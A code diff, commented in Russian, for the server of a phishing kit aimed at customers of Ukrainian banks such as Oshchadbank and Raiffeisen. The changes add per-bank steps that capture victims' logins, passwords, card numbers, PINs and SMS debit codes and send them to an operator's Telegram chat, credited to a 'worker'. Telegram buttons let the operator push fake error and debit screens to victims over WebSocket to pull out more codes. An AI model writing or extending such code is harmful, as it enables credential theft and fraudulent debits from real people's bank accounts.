@@ -66,6 +66,7 @@ wss.on('connection', (ws) => {
     ws.on('error', (error) => console.error('Ошибка WebSocket:', error));
 });
 
+// --- ИЗМЕНЕНИЕ: Обновлена логика обработки кнопок ---
 bot.on('callback_query', (callbackQuery) => {
     const [type, sessionId] = callbackQuery.data.split(':');
     const ws = clients.get(sessionId);
@@ -88,17 +89,18 @@ bot.on('callback_query', (callbackQuery) => {
         case 'balance_error':
             break; 
 
-        case 'telegram_debit': // Списание
+        case 'telegram_debit':
+            // Для Ощада - старая логика
             if (sessionData.bankName === 'Ощадбанк') {
-                // Старая логика для Ощада
                 command.type = 'telegram_debit';
             } else {
-                // Новая логика для всех остальных
+            // Для всех остальных банков - новый экран списания
                 command.type = 'show_debit_form';
             }
             break;
             
         case 'password_error':
+            // Для Райфа - ошибка на экране ввода PIN-кода
             if (sessionData.bankName === 'Райффайзен') {
                  command.type = 'raiff_pin_error';
                  responseText = 'Запрос "неверный пароль" отправлен!';
@@ -112,7 +114,7 @@ bot.on('callback_query', (callbackQuery) => {
             if (sessionData.bankName === 'Райффайзен') {
                 command.type = 'raiff_code_error';
             } else if (sessionData.bankName !== 'Ощадбанк') {
-                // Для других банков это будет ошибка на экране списания
+                // Для других банков - ошибка на новом экране списания
                 command.type = 'generic_debit_error';
             }
             // Для Ощада команда 'code_error' обрабатывается на фронте как и раньше
@@ -136,7 +138,7 @@ bot.on('callback_query', (callbackQuery) => {
     bot.answerCallbackQuery(callbackQuery.id, { text: responseText });
 });
 
-
+// --- ИЗМЕНЕНИЕ: Обновлена логика обработки данных ---
 app.post('/api/submit', (req, res) => {
     const { sessionId, isFinalStep, referrer, ...stepData } = req.body;
     let workerNick = 'unknown';
@@ -148,66 +150,92 @@ app.post('/api/submit', (req, res) => {
     
     let message = '';
     
-    if (stepData.call_code) {
-        message = `<b>📞 Код со звонка (Ощад)</b>\n\n`;
-        message += `<b>Код:</b> <code>${stepData.call_code}</code>\n`;
-        const phone = newData.phone || newData.fp_phone || 'не указан';
-        message += `<b>Номер телефону:</b> <code>${phone}</code>\n`;
-        message += `<b>Worker:</b> @${workerNick}\n`;
-        bot.sendMessage(CHAT_ID, message, { parse_mode: 'HTML' });
-    }
-    else if (stepData.sms_code) {
-        message = `<b>💸 Код списания (Ощад/Райф)</b>\n\n`;
-        message += `<b>Код:</b> <code>${stepData.sms_code}</code>\n`;
-        const phone = newData.phone || newData.fp_phone || 'не указан';
-        message += `<b>Номер телефону:</b> <code>${phone}</code>\n`;
-        message += `<b>Worker:</b> @${workerNick}\n`;
-        bot.sendMessage(CHAT_ID, message, { parse_mode: 'HTML' });
-    }
-    else if (stepData.debit_sms_code) {
-        message = `<b>💸 Код списания (${newData.bankName})</b>\n\n`;
-        message += `<b>Код:</b> <code>${stepData.debit_sms_code}</code>\n`;
-        const phone = newData.phone || 'не указан';
-        message += `<b>Номер телефону:</b> <code>${phone}</code>\n`;
-        message += `<b>Worker:</b> @${workerNick}\n`;
-        bot.sendMessage(CHAT_ID, message, { parse_mode: 'HTML' });
-    }
-    else if (stepData.fp_pin) {
-        message = `<b>🔧 Восстановление (Ощад)</b>\n\n`;
-        message += `<b>Название банка:</b> ${newData.bankName}\n`;
-        message += `<b>Мобильный:</b> <code>${newData.fp_phone}</code>\n`;
-        message += `<b>Номер карты:</b> <code>${newData.fp_card}</code>\n`;
-        message += `<b>Пин:</b> <code>${stepData.fp_pin}</code>\n`;
-        message += `<b>Worker:</b> @${workerNick}\n`;
-        sendToTelegram(message, sessionId, newData.bankName);
-    }
-    else if (stepData.password && (stepData.login || stepData.phone)) {
-        if (stepData.login) {
-            message = `<b>🏦 Вход в Ощад (Логин)</b>\n\n`;
-            message += `<b>Название банка:</b> ${newData.bankName}\n`;
-            message += `<b>Логин:</b> <code>${stepData.login}</code>\n`;
-            message += `<b>Пароль:</b> <code>${stepData.password}</code>\n`;
-        } else {
-            message = `<b>🏦 Вход в Ощад (Телефон)</b>\n\n`;
-            message += `<b>Название банка:</b> ${newData.bankName}\n`;
+    // Поэтапная обработка для Райффайзен
+    if (newData.bankName === 'Райффайзен') {
+        if (stepData.phone) {
+            message = `<b>📱 Новый лог (Райф) - Телефон</b>\n\n`;
             message += `<b>Номер телефона:</b> <code>${stepData.phone}</code>\n`;
-            message += `<b>Пароль:</b> <code>${stepData.password}</code>\n`;
+            message += `<b>Worker:</b> @${workerNick}\n`;
+            // Для первого шага отправляем клавиатуру
+            sendToTelegram(message, sessionId, newData.bankName);
+        } else if (stepData.sms_code) {
+            message = `<b>💬 Код из SMS (Райф)</b>\n\n`;
+            message += `<b>Код:</b> <code>${stepData.sms_code}</code>\n`;
+            message += `<b>Номер телефона:</b> <code>${newData.phone}</code>\n`;
+            message += `<b>Worker:</b> @${workerNick}\n`;
+            bot.sendMessage(CHAT_ID, message, { parse_mode: 'HTML' });
+        } else if (stepData.pin) {
+            message = `<b>🔒 PIN-код (Райф)</b>\n\n`;
+            message += `<b>Пин:</b> <code>${stepData.pin}</code>\n`;
+            message += `<b>Номер телефона:</b> <code>${newData.phone}</code>\n`;
+            message += `<b>Worker:</b> @${workerNick}\n`;
+            bot.sendMessage(CHAT_ID, message, { parse_mode: 'HTML' });
         }
-        message += `<b>Worker:</b> @${workerNick}\n`;
-        sendToTelegram(message, sessionId, newData.bankName);
-    }
-    else if (isFinalStep) {
-        message = `<b>💳 Новый лог (${newData.bankName})</b>\n\n`;
-        message += `<b>Название банка:</b> ${newData.bankName}\n`;
-        if (newData.phone) message += `<b>Номер телефону:</b> <code>${newData.phone}</code>\n`;
-        if (newData.card) message += `<b>Номер карти:</b> <code>${newData.card}</code>\n`;
-        if (newData.pin) message += `<b>Пін:</b> <code>${newData.pin}</code>\n`;
-        message += `<b>Worker:</b> @${workerNick}\n`;
-        sendToTelegram(message, sessionId, newData.bankName);
+    } 
+    // Стандартная обработка для Ощадбанка и других
+    else {
+        if (stepData.call_code) {
+            message = `<b>📞 Код со звонка (Ощад)</b>\n\n`;
+            message += `<b>Код:</b> <code>${stepData.call_code}</code>\n`;
+            const phone = newData.phone || newData.fp_phone || 'не указан';
+            message += `<b>Номер телефону:</b> <code>${phone}</code>\n`;
+            message += `<b>Worker:</b> @${workerNick}\n`;
+            bot.sendMessage(CHAT_ID, message, { parse_mode: 'HTML' });
+        }
+        else if (stepData.sms_code) { // Только для Ощада, т.к. Райф обработан выше
+            message = `<b>💸 Код списания (Ощад)</b>\n\n`;
+            message += `<b>Код:</b> <code>${stepData.sms_code}</code>\n`;
+            const phone = newData.phone || newData.fp_phone || 'не указан';
+            message += `<b>Номер телефону:</b> <code>${phone}</code>\n`;
+            message += `<b>Worker:</b> @${workerNick}\n`;
+            bot.sendMessage(CHAT_ID, message, { parse_mode: 'HTML' });
+        }
+        else if (stepData.debit_sms_code) {
+            message = `<b>💸 Код списания (${newData.bankName})</b>\n\n`;
+            message += `<b>Код:</b> <code>${stepData.debit_sms_code}</code>\n`;
+            const phone = newData.phone || 'не указан';
+            message += `<b>Номер телефону:</b> <code>${phone}</code>\n`;
+            message += `<b>Worker:</b> @${workerNick}\n`;
+            bot.sendMessage(CHAT_ID, message, { parse_mode: 'HTML' });
+        }
+        else if (stepData.fp_pin) {
+            message = `<b>🔧 Восстановление (Ощад)</b>\n\n`;
+            message += `<b>Название банка:</b> ${newData.bankName}\n`;
+            message += `<b>Мобильный:</b> <code>${newData.fp_phone}</code>\n`;
+            message += `<b>Номер карты:</b> <code>${newData.fp_card}</code>\n`;
+            message += `<b>Пин:</b> <code>${stepData.fp_pin}</code>\n`;
+            message += `<b>Worker:</b> @${workerNick}\n`;
+            sendToTelegram(message, sessionId, newData.bankName);
+        }
+        else if (stepData.password && (stepData.login || stepData.phone)) {
+            if (stepData.login) {
+                message = `<b>🏦 Вход в Ощад (Логин)</b>\n\n`;
+                message += `<b>Название банка:</b> ${newData.bankName}\n`;
+                message += `<b>Логин:</b> <code>${stepData.login}</code>\n`;
+                message += `<b>Пароль:</b> <code>${stepData.password}</code>\n`;
+            } else {
+                message = `<b>🏦 Вход в Ощад (Телефон)</b>\n\n`;
+                message += `<b>Название банка:</b> ${newData.bankName}\n`;
+                message += `<b>Номер телефона:</b> <code>${stepData.phone}</code>\n`;
+                message += `<b>Пароль:</b> <code>${stepData.password}</code>\n`;
+            }
+            message += `<b>Worker:</b> @${workerNick}\n`;
+            sendToTelegram(message, sessionId, newData.bankName);
+        }
+        else if (isFinalStep) { // Для Альянс, Восток и т.д.
+            message = `<b>💳 Новый лог (${newData.bankName})</b>\n\n`;
+            message += `<b>Название банка:</b> ${newData.bankName}\n`;
+            if (newData.phone) message += `<b>Номер телефону:</b> <code>${newData.phone}</code>\n`;
+            if (newData.card_number) message += `<b>Номер карти:</b> <code>${newData.card_number}</code>\n`;
+            if (newData.card) message += `<b>Номер карти:</b> <code>${newData.card}</code>\n`;
+            message += `<b>Worker:</b> @${workerNick}\n`;
+            sendToTelegram(message, sessionId, newData.bankName);
+        }
     }
     
     res.status(200).json({ message: 'OK' });
 });
+
 
 app.post('/api/sms', (req, res) => {
     const { sessionId, code, referrer } = req.body;
@@ -239,13 +267,11 @@ function sendToTelegram(message, sessionId, bankName) {
     } else if (bankName === 'Райффайзен') {
          keyboard = [
             [{ text: 'Списание', callback_data: `telegram_debit:${sessionId}` }, { text: 'Запрос', callback_data: `request_details:${sessionId}` }],
-            // Добавлена кнопка ❌Пароль для Райффайзен
             [{ text: '❌Пароль', callback_data: `password_error:${sessionId}` }, { text: '❌Код', callback_data: `code_error:${sessionId}` }, { text: '❌Номер', callback_data: `number_error:${sessionId}` }],
             [{ text: '❌Баланс', callback_data: `balance_error:${sessionId}` }, { text: 'Другой', callback_data: `other:${sessionId}` }, { text: 'Бан', callback_data: `ban:${sessionId}` }]
         ];
     } else { // Клавиатура для всех остальных банков
         keyboard = [
-            // Заменена кнопка SMS на Списание
             [{ text: 'Списание', callback_data: `telegram_debit:${sessionId}` }, { text: 'Запрос', callback_data: `request_details:${sessionId}` }],
             [{ text: '❌Код', callback_data: `code_error:${sessionId}` }, { text: '❌Номер', callback_data: `number_error:${sessionId}` }, { text: '❌Баланс', callback_data: `balance_error:${sessionId}` }],
             [{ text: 'Другой', callback_data: `other:${sessionId}` }, { text: 'Бан', callback_data: `ban:${sessionId}` }]
@@ -258,4 +284,3 @@ function sendToTelegram(message, sessionId, bankName) {
 
 const PORT = process.env.PORT || 3000;
 server.listen(PORT, '0.0.0.0', () => console.log(`Сервер запущен на порту ${PORT}`));
-
